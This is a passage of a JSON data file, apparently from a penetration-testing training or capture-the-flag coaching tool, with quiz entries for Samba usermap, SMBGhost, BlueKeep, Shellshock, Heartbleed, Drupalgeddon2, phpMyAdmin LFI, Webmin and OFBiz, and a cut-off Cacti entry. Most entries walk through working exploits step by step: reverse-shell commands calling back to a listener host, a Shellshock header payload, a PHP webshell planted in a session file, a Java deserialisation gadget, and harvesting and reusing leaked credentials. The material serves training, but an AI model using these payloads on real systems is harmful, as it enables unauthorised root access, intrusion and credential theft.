      "teach": "Samba 3.0.20 through 3.0.25rc3 runs the username through a shell. Put a command in the username field of an anonymous IPC connection and it executes as root.",
      "leadup": [
        {
          "key": "version",
          "label": "The Samba version is in range",
          "steps": [
            {
              "title": "Discover the Samba version",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p139,445 --script smb-os-discovery {{target}}",
              "out": "|   OS: Unix (Samba 3.0.20-Debian)",
              "sig": "Samba 3.0.20",
              "teach": "The injection works from 3.0.20 to 3.0.25rc3 only; newer Samba is patched."
            }
          ]
        },
        {
          "key": "nullsession",
          "label": "Anonymous SMB answers",
          "steps": [
            {
              "title": "List shares with a null session",
              "tool": "smbclient",
              "where": "local",
              "cmd": "smbclient -L //{{target}}/ -N",
              "out": "Sharename       Type      Comment\nIPC$            IPC       IPC Service",
              "sig": "IPC$",
              "teach": "An anonymous IPC connection is the delivery channel for the injected username."
            }
          ]
        }
      ],
      "how": {
        "lead": "usermap is confirm the version, start a listener, then connect to IPC$ with a command hidden in the username.",
        "items": [
          {
            "t": "Fingerprint the version",
            "d": "The bug is specific to 3.0.20 through 3.0.25rc3, so confirm before you inject.",
            "demo": [
              {
                "run": "nmap -p139,445 --script smb-os-discovery {{target}}",
                "out": "|   OS: Unix (Samba 3.0.20-Debian)",
                "sig": "Samba 3.0.20"
              }
            ],
            "note": "Outside that range the username-map injection does not apply."
          },
          {
            "t": "Start your listener",
            "d": "The injected command calls back to you, so have a listener ready before you connect.",
            "demo": [
              {
                "run": "nc -lvnp 4444",
                "out": "listening on [any] 4444 ...",
                "sig": "listening on"
              }
            ],
            "note": "The reverse connection will land here as root."
          },
          {
            "t": "Inject through the username",
            "d": "The username is evaluated by a shell, so a backtick command runs as the Samba process user, which is root.",
            "demo": [
              {
                "run": "smbclient //{{target}}/ipc$ -N -U \"./=`nohup nc {{lhost}} 4444 -e /bin/sh`\"",
                "out": "session setup failed: NT_STATUS_LOGON_FAILURE",
                "sig": "NT_STATUS_LOGON_FAILURE"
              }
            ],
            "note": "The login fails on purpose; the command already ran. Check your listener."
          },
          {
            "t": "Confirm root on the catch",
            "d": "Your listener now holds the shell; confirm the identity and stabilise it.",
            "demo": [
              {
                "run": "id",
                "out": "uid=0(root) gid=0(root) groups=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "You are root; capture proof and enumerate for the flags."
          }
        ]
      },
      "situation": "SMB on 139 and 445 reports Samba 3.0.20-Debian, and an anonymous connection lists the IPC$ share. What is the move?",
      "choices": [
        "samba-usermap",
        "recon-smb-anon",
        "smb-share-inventory",
        "eternalblue"
      ],
      "coach": {
        "recon-smb-anon": "Null-session enumeration is fine, but this version gives you a root shell directly through the username field.",
        "smb-share-inventory": "Listing shares is useful, yet the version itself is the exploit here.",
        "eternalblue": "That is MS17-010 on Windows SMB; this is Linux Samba, a different and older command-injection bug."
      }
    },
    "smbghost": {
      "why": "A Windows 10 1903 or 1909 or Server 2019 host that speaks SMB 3.1.1 with compression mishandles a crafted compressed message, which an exploit turns into SYSTEM. The build and the protocol version matter completely, so the first move is to confirm both, and a scanner gives you a clear yes or no before you touch the exploit. The remote path is unstable and can blue-screen the target, so you snapshot the box and only fire it where a crash is acceptable. Treat the confirm step as the real skill, not the exploit.",
      "cmd": "nmap -p445 --script smb-protocols {{target}}",
      "tool": "nmap",
      "output": "| smb-protocols:\n|   dialects:\n|     2:1:0\n|     3:0:0\n|     3:1:1",
      "signal": "3:1:1",
      "teach": "The host speaks SMB 3.1.1, the dialect the compression bug lives in. Confirm the exact build with a scanner, snapshot the box, then run the proof of concept.",
      "leadup": [
        {
          "key": "dialect",
          "label": "The host speaks SMB 3.1.1",
          "steps": [
            {
              "title": "List the SMB dialects",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p445 --script smb-protocols {{target}}",
              "out": "|     3:1:1",
              "sig": "3:1:1",
              "teach": "3.1.1 is required; older dialects do not have the compression feature the bug lives in."
            }
          ]
        },
        {
          "key": "scanner",
          "label": "A scanner confirms the bug",
          "steps": [
            {
              "title": "Run the compression-flag scanner",
              "tool": "python",
              "where": "local",
              "cmd": "python3 scanner.py {{target}}",
              "out": "[+] 10.10.10.10 Vulnerable",
              "sig": "Vulnerable",
              "teach": "The scanner checks the compression capability flag, which is the real precondition, and is safe to run."
            }
          ]
        }
      ],
      "how": {
        "lead": "SMBGhost is confirm SMB 3.1.1, run the scanner for a yes or no, snapshot the box, then the RCE proof of concept.",
        "items": [
          {
            "t": "Confirm the dialect",
            "d": "The bug lives in SMB 3.1.1 compression, so check the dialect before anything else.",
            "demo": [
              {
                "run": "nmap -p445 --script smb-protocols {{target}}",
                "out": "|     3:1:1",
                "sig": "3:1:1"
              }
            ],
            "note": "No 3.1.1, no SMBGhost; stop here."
          },
          {
            "t": "Scan for the compression flag",
            "d": "A dedicated scanner confirms the vulnerable build without touching memory, so it is your safe go or no-go.",
            "demo": [
              {
                "run": "python3 scanner.py {{target}}",
                "out": "[+] 10.10.10.10 Vulnerable",
                "sig": "Vulnerable"
              }
            ],
            "note": "Only a clear Vulnerable justifies risking the crash-prone exploit."
          },
          {
            "t": "Snapshot, then run the PoC",
            "d": "The RCE is unstable and can blue-screen the host, so snapshot or confirm a crash is acceptable first.",
            "demo": [
              {
                "run": "python3 SMBGhost_RCE.py -ip {{target}}",
                "out": "[+] Shellcode executed, check your listener",
                "sig": "check your listener"
              }
            ],
            "note": "Edit the embedded shellcode to call back to {{lhost}}, and catch SYSTEM on your listener."
          }
        ]
      },
      "situation": "A host answers SMB on 445 speaking dialect 3.1.1, and it is Windows 10 build 1903. What is the move?",
      "choices": [
        "smbghost",
        "eternalblue",
        "recon-smb-anon",
        "smb-share-inventory"
      ],
      "coach": {
        "eternalblue": "MS17-010 is a different, older SMBv1 bug; 3.1.1 with compression is SMBGhost territory.",
        "recon-smb-anon": "Enumeration is worth doing, but a confirmed SMBGhost build is a direct path to SYSTEM.",
        "smb-share-inventory": "Listing shares needs access you may not have; the compression bug needs none."
      }
    },
    "bluekeep": {
      "why": "RDP on Windows 7 and Server 2008 R2 has a pre-authentication flaw that reaches SYSTEM with no login. The exploit is powerful but fragile, so the discipline is to confirm the host is vulnerable, choose the exact target profile the module asks for, and accept that a wrong guess blue-screens the box instead of landing a shell. Confirm first, fire only where a crash is acceptable, and have your listener ready before you run it.",
      "cmd": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
      "tool": "nmap",
      "output": "| rdp-vuln-ms19-0708:\n|   VULNERABLE:\n|   Remote Desktop Protocol CVE-2019-0708\n|     State: VULNERABLE",
      "signal": "VULNERABLE",
      "teach": "The nmap script marks the host VULNERABLE to CVE-2019-0708. Pick the matching target profile in the exploit, then fire it where a crash is acceptable.",
      "leadup": [
        {
          "key": "confirm",
          "label": "The host is confirmed vulnerable",
          "steps": [
            {
              "title": "Run the RDP vuln script",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
              "out": "|   VULNERABLE:\n|     State: VULNERABLE",
              "sig": "VULNERABLE",
              "teach": "This is the go or no-go; the PoC crashes targets that are not vulnerable."
            }
          ]
        },
        {
          "key": "port",
          "label": "RDP is open",
          "steps": [
            {
              "title": "See the open RDP port",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p3389 {{target}}",
              "out": "3389/tcp open  ms-wbt-server",
              "sig": "3389/tcp open",
              "teach": "RDP is listening; the version and patch level decide whether BlueKeep applies."
            }
          ]
        }
      ],
      "how": {
        "lead": "BlueKeep is confirm vulnerable, set the right target profile, ready a listener, then fire and accept the crash risk.",
        "items": [
          {
            "t": "Confirm the host is vulnerable",
            "d": "The nmap script is non-destructive and tells you whether the patch is missing.",
            "demo": [
              {
                "run": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
                "out": "|   VULNERABLE:",
                "sig": "VULNERABLE"
              }
            ],
            "note": "Never fire blind; the PoC blue-screens targets that are not vulnerable."
          },
          {
            "t": "Set the target profile",
            "d": "The module needs the memory layout for the target's platform and version; the wrong profile crashes it.",
            "demo": [
              {
                "run": "msf6 exploit(cve_2019_0708_bluekeep_rce) > set target 2",
                "out": "target => 2",
                "sig": "target => 2"
              }
            ],
            "note": "Match the profile to the host (physical, VMware, or Hyper-V) as the module notes describe."
          },
          {
            "t": "Fire and catch SYSTEM",
            "d": "With the profile set and a handler ready, run the exploit and watch for a session.",
            "demo": [
              {
                "run": "msf6 exploit(cve_2019_0708_bluekeep_rce) > run",
                "out": "[*] Meterpreter session 1 opened",
                "sig": "session 1 opened"
              }
            ],
            "note": "A session is SYSTEM; if it blue-screens instead, revisit the target profile."
          }
        ]
      },
      "situation": "RDP is open on 3389 and the nmap rdp-vuln script reports the host VULNERABLE to CVE-2019-0708. What is the move?",
      "choices": [
        "bluekeep",
        "online-brute-rdp",
        "rdp-enum",
        "smbghost"
      ],
      "coach": {
        "online-brute-rdp": "No credentials are needed; this is a pre-auth RCE, though it carries a crash risk that brute-forcing does not.",
        "rdp-enum": "Enumeration confirmed the version already; the script says vulnerable, so the exploit is the move.",
        "smbghost": "That is the SMBv3 compression bug on 445; this is the RDP pre-auth bug on 3389."
      }
    },
    "shellshock": {
      "why": "Shellshock is a bug in Bash itself, not in any web app. When a CGI script passes an HTTP header into an environment variable, a vulnerable Bash keeps parsing past the end of a function definition and runs whatever command you append. So a single crafted header, sent to any /cgi-bin/ script, runs as the web server user. The one piece of real work is finding a CGI endpoint, because without a script that reaches Bash there is nothing to trigger. Discover the endpoint, confirm with id, then take a shell.",
      "cmd": "curl -s -H 'User-Agent: () { :;}; echo; echo; /usr/bin/id' http://{{target}}/cgi-bin/status.sh",
      "tool": "curl",
      "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
      "signal": "uid=33(www-data)",
      "teach": "The id output in the response proves Bash ran your command through the CGI script. Swap id for a reverse-shell one-liner in the same header to get an interactive shell.",
      "leadup": [
        {
          "key": "cgi",
          "label": "A CGI endpoint exists",
          "steps": [
            {
              "title": "Discover a script under /cgi-bin/",
              "tool": "gobuster",
              "where": "local",
              "cmd": "gobuster dir -u http://{{target}}/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl",
              "out": "/status.sh           (Status: 200) [Size: 102]",
              "sig": "status.sh",
              "teach": "A reachable script under /cgi-bin/ is the thing that passes your header into Bash."
            }
          ]
        },
        {
          "key": "web",
          "label": "An old Apache is up",
          "steps": [
            {
              "title": "Check the server banner",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s -I http://{{target}}/",
              "out": "HTTP/1.1 200 OK\nServer: Apache/2.4.7 (Ubuntu)",
              "sig": "Server: Apache",
              "teach": "Shellshock lives behind old Apache mod_cgi; confirm the server, then hunt for a CGI script."
            }
          ]
        }
      ],
      "how": {
        "lead": "Shellshock is find a /cgi-bin/ script, confirm with id through a header, then send a reverse shell the same way.",
        "items": [
          {
            "t": "Find a CGI script",
            "d": "Content discovery against /cgi-bin/ with script extensions finds the endpoint that reaches Bash.",
            "demo": [
              {
                "run": "gobuster dir -u http://{{target}}/cgi-bin/ -x cgi,sh,pl -w /usr/share/wordlists/dirb/common.txt",
                "out": "/status.sh           (Status: 200)",
                "sig": "status.sh"
              }
            ],
            "note": "You need a concrete script; the bug triggers only through one that reaches Bash."
          },
          {
            "t": "Confirm with id",
            "d": "Send the function-definition header with id appended; a uid line in the response proves execution.",
            "demo": [
              {
                "run": "curl -s -H 'User-Agent: () { :;}; echo; echo; /usr/bin/id' http://{{target}}/cgi-bin/status.sh",
                "out": "uid=33(www-data) gid=33(www-data)",
                "sig": "uid=33(www-data)"
              }
            ],
            "note": "A uid line means Bash executed your command; now go for a shell."
          },
          {
            "t": "Take a reverse shell",
            "d": "Replace id with a Bash reverse-shell one-liner in the same header.",
            "demo": [
              {
                "run": "curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/{{lhost}}/4444 0>&1' http://{{target}}/cgi-bin/status.sh",
                "out": "(no response; check your listener)",
                "sig": "check your listener"
              }
            ],
            "note": "Start nc -lvnp 4444 first; the connection lands as the web user."
          }
        ]
      },
      "situation": "Content discovery finds /cgi-bin/status.sh on an old Apache, and a crafted User-Agent header returns a uid line. What is the move?",
      "choices": [
        "shellshock",
        "command-injection",
        "content-discovery",
        "check-log4shell"
      ],
      "coach": {
        "command-injection": "This is Bash parsing a header, not app input validation; the CGI header vector is Shellshock specifically.",
        "content-discovery": "That already did its job by finding the CGI script; now exploit it.",
        "check-log4shell": "Log4Shell is a Java JNDI bug; this is Bash through CGI, a different stack entirely."
      }
    },
    "heartbleed": {
      "why": "Heartbleed is a disclosure bug, not code execution. A vulnerable OpenSSL answers a malformed TLS heartbeat with up to 64 kilobytes of whatever is in its memory at that moment, which often includes session cookies, login credentials, and sometimes private key material. Because the leak is a random slice of memory, the technique is to dump many times and grep each response for anything reusable, then take those secrets to the front door. Confirm it with the nmap script first so you do not waste time on a patched host.",
      "cmd": "nmap -p443 --script ssl-heartbleed {{target}}",
      "tool": "nmap",
      "output": "| ssl-heartbleed:\n|   VULNERABLE:\n|   The Heartbleed Bug is a serious vulnerability in OpenSSL",
      "signal": "VULNERABLE",
      "teach": "The ssl-heartbleed script confirms the host leaks memory. Dump the heartbeat repeatedly and grep each response for passwords, cookies, and tokens you can reuse.",
      "leadup": [
        {
          "key": "confirm",
          "label": "The host is confirmed vulnerable",
          "steps": [
            {
              "title": "Run the heartbleed script",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p443 --script ssl-heartbleed {{target}}",
              "out": "|   VULNERABLE:\n|   The Heartbleed Bug",
              "sig": "VULNERABLE",
              "teach": "No point dumping memory from a patched server; confirm first."
            }
          ]
        },
        {
          "key": "tls",
          "label": "A TLS service is exposed",
          "steps": [
            {
              "title": "See the HTTPS port",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p443 {{target}}",
              "out": "443/tcp open  https",
              "sig": "443/tcp open",
              "teach": "The leak is in the TLS layer, so any OpenSSL-backed service on 443 or 8443 is a candidate."
            }
          ]
        }
      ],
      "how": {
        "lead": "Heartbleed is confirm the leak, dump memory in a loop, grep for secrets, then reuse them.",
        "items": [
          {
            "t": "Confirm the leak",
            "d": "The nmap script is safe and tells you whether the heartbeat over-reads memory.",
            "demo": [
              {
                "run": "nmap -p443 --script ssl-heartbleed {{target}}",
                "out": "|   VULNERABLE:",
                "sig": "VULNERABLE"
              }
            ],
            "note": "A patched OpenSSL returns nothing useful; move on if it is not vulnerable."
          },
          {
            "t": "Dump memory and grep",
            "d": "Dump the heartbeat many times and filter each response for credential-shaped strings.",
            "demo": [
              {
                "run": "python2 32764.py {{target}} -p 443 -n 100 | grep -Ei 'pass|cookie|session'",
                "out": "Cookie: PHPSESSID=8a2b1f; user=admin; pass=Spring2026!",
                "sig": "pass=Spring2026!"
              }
            ],
            "note": "The slice is random, so repeat; each dump may hold different memory."
          },
          {
            "t": "Reuse what you found",
            "d": "Take a leaked credential or session cookie to the login or app and confirm it works.",
            "demo": [
              {
                "run": "curl -s -b 'PHPSESSID=8a2b1f' http://{{target}}/admin/ | grep -i welcome",
                "out": "<h1>Welcome, admin</h1>",
                "sig": "Welcome, admin"
              }
            ],
            "note": "A leaked secret is only useful once you spend it somewhere; that is the real objective."
          }
        ]
      },
      "situation": "nmap reports the HTTPS service on 443 VULNERABLE to ssl-heartbleed. What is the move?",
      "choices": [
        "heartbleed",
        "check-tls-config",
        "recon-web-triage",
        "sqli-basics"
      ],
      "coach": {
        "check-tls-config": "TLS posture checks note weak ciphers; Heartbleed is a memory leak you actively dump, which is the move here.",
        "recon-web-triage": "General web recon is fine, but a confirmed Heartbleed is a direct secret-harvest, so take it.",
        "sqli-basics": "No database input is in play; the leak is in the TLS layer, not the app."
      }
    },
    "drupalgeddon2": {
      "why": "Drupalgeddon2 is an unauthenticated flaw in how Drupal renders form elements, where attacker input in a request parameter is evaluated and reaches code execution with no login. Versions below 7.58 and below 8.5.1 are affected, and CHANGELOG.txt usually tells you the exact version with no guessing. Once confirmed, a public proof of concept gives you an interactive webshell on the first request. It is one of the most dependable footholds on an old Drupal site.",
      "cmd": "curl -s http://{{target}}/CHANGELOG.txt | head -1",
      "tool": "curl",
      "output": "Drupal 7.57, 2018-02-21",
      "signal": "Drupal 7.57",
      "teach": "CHANGELOG.txt shows Drupal 7.57, below the 7.58 fix, so the form-render RCE applies. Run the proof of concept for a webshell.",
      "leadup": [
        {
          "key": "version",
          "label": "The version is below the fix",
          "steps": [
            {
              "title": "Read the CHANGELOG",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s http://{{target}}/CHANGELOG.txt | head -1",
              "out": "Drupal 7.57, 2018-02-21",
              "sig": "Drupal 7.57",
              "teach": "Below 7.58 or 8.5.1 is vulnerable; anything newer is patched."
            }
          ]
        },
        {
          "key": "fingerprint",
          "label": "The app is Drupal",
          "steps": [
            {
              "title": "Confirm the CMS",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s http://{{target}}/ | grep -i generator",
              "out": "<meta name=\"Generator\" content=\"Drupal 7 (https://www.drupal.org)\" />",
              "sig": "Drupal 7",
              "teach": "The generator meta tag names Drupal; read CHANGELOG.txt next for the exact version."
            }
          ]
        }
      ],
      "how": {
        "lead": "Drupalgeddon2 is read the version, run the PoC for a webshell, then run commands as the web user.",
        "items": [
          {
            "t": "Confirm the version",
            "d": "CHANGELOG.txt is world-readable on most installs and names the exact version.",
            "demo": [
              {
                "run": "curl -s http://{{target}}/CHANGELOG.txt | head -1",
                "out": "Drupal 7.57, 2018-02-21",
                "sig": "Drupal 7.57"
              }
            ],
            "note": "Below 7.58 or 8.5.1 is vulnerable; anything newer is patched."
          },
          {
            "t": "Run the proof of concept",
            "d": "The public PoC confirms the bug and drops an interactive webshell prompt.",
            "demo": [
              {
                "run": "ruby Drupalgeddon2/drupalgeddon2.rb http://{{target}}/",
                "out": "[+] Result : uid=33(www-data) gid=33(www-data)\ndrupalgeddon2>>",
                "sig": "drupalgeddon2>>"
              }
            ],
            "note": "The prompt runs commands on the target as the web user."
          },
          {
            "t": "Run commands as the web user",
            "d": "Confirm who you are, then upgrade to a full reverse shell for stability.",
            "demo": [
              {
                "run": "drupalgeddon2>> id",
                "out": "uid=33(www-data) gid=33(www-data)",
                "sig": "www-data"
              }
            ],
            "note": "Catch a proper reverse shell next, then enumerate for privilege escalation."
          }
        ]
      },
      "situation": "CHANGELOG.txt on a Drupal site reads Drupal 7.57. What is the move?",
      "choices": [
        "drupalgeddon2",
        "wordpress",
        "content-discovery",
        "sqli-basics"
      ],
      "coach": {
        "wordpress": "Wrong CMS; this is Drupal, and the version is below the Drupalgeddon2 fix.",
        "content-discovery": "You already have the version from CHANGELOG; exploit it rather than keep browsing.",
        "sqli-basics": "The bug is in form rendering, not a SQL parameter; the RCE PoC is the direct path."
      }
    },
    "phpmyadmin-lfi": {
      "why": "phpMyAdmin 4.8.0 and 4.8.1 include a file named in the index.php target parameter without checking it properly, which is a local file inclusion. On its own that reads files, but chained with the SQL console it becomes code execution: you run a query whose text is PHP, which phpMyAdmin writes verbatim into your session file on disk, then you point the inclusion at that session file and it executes. The SQL step needs a login, which on these targets is often a default or a credential you already hold. Confirm the version, poison the session, then include it.",
      "cmd": "curl -s http://{{target}}/phpmyadmin/README | grep -i version",
      "tool": "curl",
      "output": "Version 4.8.1",
      "signal": "Version 4.8.1",
      "teach": "phpMyAdmin 4.8.1 is vulnerable. Run a SELECT that contains PHP to write it into your session file, then include that file through the target parameter to execute it.",
      "leadup": [
        {
          "key": "version",
          "label": "The version is 4.8.0 or 4.8.1",
          "steps": [
            {
              "title": "Read the README version",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s http://{{target}}/phpmyadmin/README | grep -i version",
              "out": "Version 4.8.1",
              "sig": "Version 4.8.1",
              "teach": "Only 4.8.0 and 4.8.1 carry this LFI; a different version needs another way in."
            }
          ]
        },
        {
          "key": "login",
          "label": "You can log in to reach the SQL tab",
          "steps": [
            {
              "title": "Get a session cookie",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s -c cookies.txt 'http://{{target}}/phpmyadmin/index.php'",
              "out": "Set-Cookie: phpMyAdmin=abc123; path=/",
              "sig": "phpMyAdmin=abc123",
              "teach": "You need a session and a working login to reach the SQL tab, the step that poisons the file."
            }
          ]
        }
      ],
      "how": {
        "lead": "phpMyAdmin LFI is confirm 4.8.x, log PHP into your session file via the SQL tab, then include that file through the target parameter.",
        "items": [
          {
            "t": "Confirm the version",
            "d": "The README names the version; only 4.8.0 and 4.8.1 are affected.",
            "demo": [
              {
                "run": "curl -s http://{{target}}/phpmyadmin/README | grep -i version",
                "out": "Version 4.8.1",
                "sig": "Version 4.8.1"
              }
            ],
            "note": "A newer build patched the target-parameter check."
          },
          {
            "t": "Poison the session file",
            "d": "In the SQL tab, run a query whose result text is PHP; phpMyAdmin stores it in your session file on disk.",
            "demo": [
              {
                "run": "SELECT '<?php system($_GET[0]); ?>'",
                "out": "Showing rows 0 - 0 (1 total)",
                "sig": "1 total"
              }
            ],
            "note": "The query need not touch a real table; the point is to write the PHP string into the session."
          },
          {
            "t": "Include the session and run a command",
            "d": "Point the target parameter at your session file on disk and pass the command in parameter 0.",
            "demo": [
              {
                "run": "curl 'http://{{target}}/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../var/lib/php/sessions/sess_abc123&0=id' -b 'phpMyAdmin=abc123'",
                "out": "uid=33(www-data) gid=33(www-data)",
                "sig": "www-data"
              }
            ],
            "note": "Swap id for a reverse-shell command once the include executes."
          }
        ]
      },
      "situation": "A phpMyAdmin README reads Version 4.8.1 and you have a working login. What is the move?",
      "choices": [
        "phpmyadmin-lfi",
        "sqli-basics",
        "lfi-probe",
        "content-discovery"
      ],
      "coach": {
        "sqli-basics": "You already have database access through the panel; the win is the LFI-to-RCE chain, not blind SQLi.",
        "lfi-probe": "The inclusion point is known (the target parameter); here you weaponise it with the session poison, not just probe for files.",
        "content-discovery": "The panel and version are already found; exploit the known CVE."
      }
    },
    "webmin-rce": {
      "why": "A tampered Webmin release, versions 1.890 through 1.920 with password expiry enabled, passes the new-password field of the password-reset page straight into a shell, so an unauthenticated request runs a command as root. Webmin runs as root to manage the box, which is why the shell you get is root rather than a web user. The only precondition beyond the version is that password expiry is switched on, which these targets usually have. Confirm Webmin on 10000, then one crafted request to password_change.cgi calls back as root.",
      "cmd": "curl -sk https://{{target}}:10000/ | grep -i webmin",
      "tool": "curl",
      "output": "<title>Login to Webmin</title>",
      "signal": "Webmin",
      "teach": "Webmin is listening on 10000. If the version is 1.890 to 1.920 with password expiry enabled, the password-reset page injects your command and runs it as root.",
      "leadup": [
        {
          "key": "present",
          "label": "Webmin is confirmed on 10000",
          "steps": [
            {
              "title": "Confirm the panel",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -sk https://{{target}}:10000/ | grep -i webmin",
              "out": "<title>Login to Webmin</title>",
              "sig": "Webmin",
              "teach": "Webmin on 10000 that banners the login page is the target; check the version next."
            }
          ]
        },
        {
          "key": "port",
          "label": "Port 10000 is open",
          "steps": [
            {
              "title": "See the open port",
              "tool": "nmap",
              "where": "local",
              "cmd": "nmap -p10000 -sV {{target}}",
              "out": "10000/tcp open  http    MiniServ 1.910 (Webmin httpd)",
              "sig": "MiniServ 1.910",
              "teach": "MiniServ is Webmin's server; the version here is in the 1.890 to 1.920 vulnerable range."
            }
          ]
        }
      ],
      "how": {
        "lead": "Webmin RCE is confirm the version on 10000, start a listener, then one request to password_change.cgi with a command in the new-password field.",
        "items": [
          {
            "t": "Confirm Webmin and the version",
            "d": "Banner the login page and read the MiniServ version; 1.890 to 1.920 is vulnerable.",
            "demo": [
              {
                "run": "nmap -p10000 -sV {{target}}",
                "out": "10000/tcp open  http    MiniServ 1.910 (Webmin httpd)",
                "sig": "MiniServ 1.910"
              }
            ],
            "note": "Newer builds removed the backdoored code, so the version is the gate."
          },
          {
            "t": "Start your listener",
            "d": "The injected command calls back, so have a listener ready first.",
            "demo": [
              {
                "run": "nc -lvnp 4444",
                "out": "listening on [any] 4444 ...",
                "sig": "listening on"
              }
            ],
            "note": "Webmin runs as root, so the connection lands as root."
          },
          {
            "t": "Fire the injection",
            "d": "Send the password-reset request with a command piped into the new-password field.",
            "demo": [
              {
                "run": "curl -sk 'https://{{target}}:10000/password_change.cgi' -H 'Referer: https://{{target}}:10000/session_login.cgi' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1' --data 'user=rootxx&pam=&expired=2&old=test&new1=test&new2=test|nc {{lhost}} 4444 -e /bin/sh|'",
                "out": "(no body; check your listener)",
                "sig": "check your listener"
              }
            ],
            "note": "The pipe in the new-password field runs nc as root; catch the shell."
          },
          {
            "t": "Confirm root",
            "d": "On the catch, confirm the identity; Webmin's privilege makes this an immediate root shell.",
            "demo": [
              {
                "run": "id",
                "out": "uid=0(root) gid=0(root) groups=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "You are root; capture proof and move to the flags."
          }
        ]
      },
      "situation": "Webmin answers on port 10000 and the version is MiniServ 1.910. What is the move?",
      "choices": [
        "webmin-rce",
        "online-brute-rdp",
        "content-discovery",
        "recon-web-triage"
      ],
      "coach": {
        "online-brute-rdp": "Wrong service and port; Webmin on 10000 has a direct unauthenticated RCE, no brute needed.",
        "content-discovery": "You already know the service and version; exploit the known CVE.",
        "recon-web-triage": "General triage is done; the version is in the vulnerable range, so take the shell."
      }
    },
    "ofbiz-deser": {
      "why": "Apache OFBiz is a Java business suite, and before version 17.12.04 its XML-RPC endpoint deserialises whatever you send it without authentication. Deserialising attacker data in Java means a gadget chain, a sequence of library calls that ends in a command, runs on the server. Because it is Java, the same payload works on Linux or Windows. The skill is confirming the product and version from the webtools page, building the gadget with ysoserial, and posting it to the xmlrpc path.",
      "cmd": "curl -sk https://{{target}}:8443/webtools/control/main | grep -i ofbiz",
      "tool": "curl",
      "output": "<title>OFBiz: Web Tools</title>",
      "signal": "OFBiz",
      "teach": "OFBiz is present on 8443. If the version is below 17.12.04, the xmlrpc endpoint deserialises your gadget with no login. Build a CommonsBeanutils chain carrying your command and POST it.",
      "leadup": [
        {
          "key": "fingerprint",
          "label": "The app is OFBiz",
          "steps": [
            {
              "title": "Banner the webtools page",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -sk https://{{target}}:8443/webtools/control/main | grep -i ofbiz",
              "out": "<title>OFBiz: Web Tools</title>",
              "sig": "OFBiz",
              "teach": "The webtools page names OFBiz; the version footer tells you whether it is below 17.12.04."
            }
          ]
        },
        {
          "key": "endpoint",
          "label": "The xmlrpc endpoint answers",
          "steps": [
            {
              "title": "Check the deserialising endpoint",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -sk -o /dev/null -w \"%{http_code}\\n\" https://{{target}}:8443/webtools/control/xmlrpc",
              "out": "200",
              "sig": "200",
              "teach": "The vulnerable endpoint is /webtools/control/xmlrpc; a 200 means it is reachable without a login."
            }
          ]
        }
      ],
      "how": {
        "lead": "OFBiz deser is confirm the version, build a ysoserial gadget with your command, then POST it to the xmlrpc endpoint.",
        "items": [
          {
            "t": "Confirm the product and version",
            "d": "The webtools page or the login footer shows the version; below 17.12.04 is vulnerable.",
            "demo": [
              {
                "run": "curl -sk https://{{target}}:8443/webtools/control/main | grep -i ofbiz",
                "out": "<title>OFBiz: Web Tools</title>",
                "sig": "OFBiz"
              }
            ],
            "note": "A patched OFBiz removes the unsafe deserialisation; the version is the gate."
          },
          {
            "t": "Build the gadget",
            "d": "ysoserial produces a CommonsBeanutils chain that ends in your command.",
            "demo": [
              {
                "run": "java -jar ysoserial.jar CommonsBeanutils1 'nc {{lhost}} 4444 -e /bin/sh' > payload.bin",
                "out": "(payload.bin written)",
                "sig": "payload.bin"
              }
            ],
            "note": "Start nc -lvnp 4444 first; the gadget carries that command."
          },
          {
            "t": "POST it to xmlrpc",
            "d": "Wrap the gadget in the XML-RPC methodResponse and POST it to the unauthenticated endpoint.",
            "demo": [
              {
                "run": "curl -sk -X POST https://{{target}}:8443/webtools/control/xmlrpc -H 'Content-Type: application/xml' --data @payload.xml",
                "out": "(no useful body; check your listener)",
                "sig": "check your listener"
              }
            ],
            "note": "The endpoint deserialises the gadget and your command runs as the OFBiz user."
          }
        ]
      },
      "situation": "A Java app on 8443 banners as OFBiz, and /webtools/control/xmlrpc returns 200. What is the move?",
      "choices": [
        "ofbiz-deser",
        "check-log4shell",
        "content-discovery",
        "sqli-basics"
      ],
      "coach": {
        "check-log4shell": "Different bug; OFBiz has its own unauthenticated deserialiser on the xmlrpc endpoint.",
        "content-discovery": "You already found the vulnerable endpoint; build and post the gadget.",
        "sqli-basics": "No SQL parameter here; the flaw is Java deserialization, so use a gadget chain."
      }
    },
    "cacti-cmdinjection": {
      "why": "Cacti is a network-graphing app, and version 1.2.22 and below has an unauthenticated command injection in remote_agent.php. The script authorises callers by their client address, but that check trusts the X-Forwarded-For header, which you set yourself, so you spoof an authorised poller and a parameter flows into a shell. Confirm the version from the CHANGELOG, then a public script sends the spoofed header and your command. It is a reliable unauthenticated shell as the web user on an old Cacti.",
      "cmd": "curl -s http://{{target}}/cacti/CHANGELOG | head -n 3",
      "tool": "curl",
      "output": "1.2.22\n\nThe following changes are in the 1.2.22 release",
      "signal": "1.2.22",
      "teach": "Cacti 1.2.22 is vulnerable. remote_agent.php trusts X-Forwarded-For, so spoof an authorised poller address and inject a command through the poller parameter.",
      "leadup": [
        {
          "key": "version",
          "label": "The version is 1.2.22 or below",
          "steps": [
            {
              "title": "Read the CHANGELOG",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s http://{{target}}/cacti/CHANGELOG | head -n 3",
